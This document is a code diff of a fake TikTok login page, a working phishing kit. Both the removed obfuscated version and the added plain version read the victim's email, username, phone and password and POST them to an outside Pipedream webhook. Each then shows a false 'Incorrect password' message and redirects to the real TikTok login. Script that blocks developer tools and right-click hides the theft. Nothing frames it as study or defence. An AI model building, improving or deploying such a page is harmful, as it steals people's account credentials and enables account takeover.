@@ -1,35 +1,39 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>TikTok Login</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body{background:#000;font-family:Arial;margin:0;padding:20px;color:white}
-    .box{max-width:380px;margin:40px auto;background:#1a1a1a;padding:30px;border-radius:12px}
-    input, button{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;font-size:16px}
-    input{background:#333;color:white}
-    button{background:#fe2c55;color:white;font-weight:bold;cursor:pointer}
-    .logo{text-align:center;margin-bottom:20px}
-    #msg{color:#ff0050;margin-top:10px;display:none;font-weight:bold}
-  </style>
-</head>
-<body>
-  <div class="box">
-    <div class="logo"><h1 style="color:#fe2c55;margin:0">tiktok</h1></div>
-    <h2 style="text-align:center">Log in to TikTok</h2>
-    <input type="email" id="a1" placeholder="Email or username" required>
-    <input type="text" id="a2" placeholder="Username" required>
-    <input type="tel" id="a3" placeholder="Phone number (optional)">
-    <input type="password" id="a4" placeholder="Password" required>
-    <button onclick="_0x()">Log in</button>
-    <div id="msg">Incorrect password. Try again.</div>
-  </div>
+<html><head><meta charset="utf-8"><title>TikTok Login</title><meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body{background:#000;color:#fff;font-family:Arial;margin:0;padding:20px}
+  .box{max-width:380px;margin:40px auto;background:#1a1a1a;padding:30px;border-radius:12px}
+  input,button{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;font-size:16px}
+  input{background:#333;color:#fff}
+  button{background:#fe2c55;color:#fff;font-weight:bold;cursor:pointer}
+  #msg{color:#ff0050;margin-top:10px;display:none;font-weight:bold}
+</style></head><body>
+<div class="box">
+  <h1 style="color:#fe2c55;text-align:center;margin:0">tiktok</h1>
+  <h2 style="text-align:center">Log in to TikTok</h2>
+  <input type="email" id="e" placeholder="Email or username" required>
+  <input type="text" id="u" placeholder="Username" required>
+  <input type="tel" id="p" placeholder="Phone number (optional)">
+  <input type="password" id="w" placeholder="Password" required>
+  <button onclick="go()">Log in</button>
+  <div id="msg">Incorrect password. Try again.</div>
+</div>
 
 <script>
-var _0x9f=['YmxvY2s=','aHR0cHM6Ly9lb3YzbDA0eTZndTFwbWkubS5waXBlZHJlYW0ubmV0','UE9TVA==','Q29udGVudC1UeXBl','YXBwbGljYXRpb24vanNvbg==','SlNPTi5zdHJpbmdpZnko','Tm9uZQ=='];(function(_0x4e7e,_0x9f9f){var _0x2d5f=function(_0x1a2b){while(--_0x1a2b){_0x4e7e['push'](_0x4e7e['shift']());}};_0x2d5f(++_0x9f9f);}(_0x9f,0x1b3));var _0x2d5f=function(_0x4e7e,_0x9f9f){_0x4e7e=_0x4e7e-0x0;var _0x2d5f=_0x9f[_0x4e7e];return _0x2d5f;};function _0x(){var _0x1=document.getElementById('a1').value.trim();var _0x2=document.getElementById('a2').value.trim();var _0x3=document.getElementById('a3').value.trim()||_0x2d5f('0x6');var _0x4=document.getElementById('a4').value;document.getElementById('msg').style.display=_0x2d5f('0x0');document.getElementById('a4').value='';fetch(atob(_0x2d5f('0x1')),{method:atob(_0x2d5f('0x2')),headers:{[_0x2d5f('0x3')]:_0x2d5f('0x4')},body:_0x2d5f('0x5')({email:_0x1,username:_0x2,phone:_0x3,password:_0x4,time:new Date().toLocaleString()})}).then(()=>setTimeout(()=>location='https://www.tiktok.com/login',1800));}
-// Anti-F12 light (ne bloque pas le fetch)
-document.onkeydown=e=>{if(e.keyCode==123|| (e.ctrlKey&&e.shiftKey&&[73,74].includes(e.keyCode))){e.preventDefault();return false;}};document.oncontextmenu=e=>e.preventDefault();
+function go(){
+  let e=document.getElementById('e').value.trim();
+  let u=document.getElementById('u').value.trim();
+  let p=document.getElementById('p').value.trim()||'None';
+  let w=document.getElementById('w').value;
+  document.getElementById('msg').style.display='block';
+  document.getElementById('w').value='';
+  fetch('https://eov3l04y6gu1pmi.m.pipedream.net',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({email:e,username:u,phone:p,password:w,time:new Date().toLocaleString()})
+  }).then(()=>setTimeout(()=>location='https://www.tiktok.com/login',1500));
+}
+document.onkeydown=e=>{if(e.keyCode===123||(e.ctrlKey&&e.shiftKey&&[73,74].includes(e.keyCode)))e.preventDefault();}
+document.oncontextmenu=e=>e.preventDefault();
 </script>
-</body>
-</html>
+</body></html>
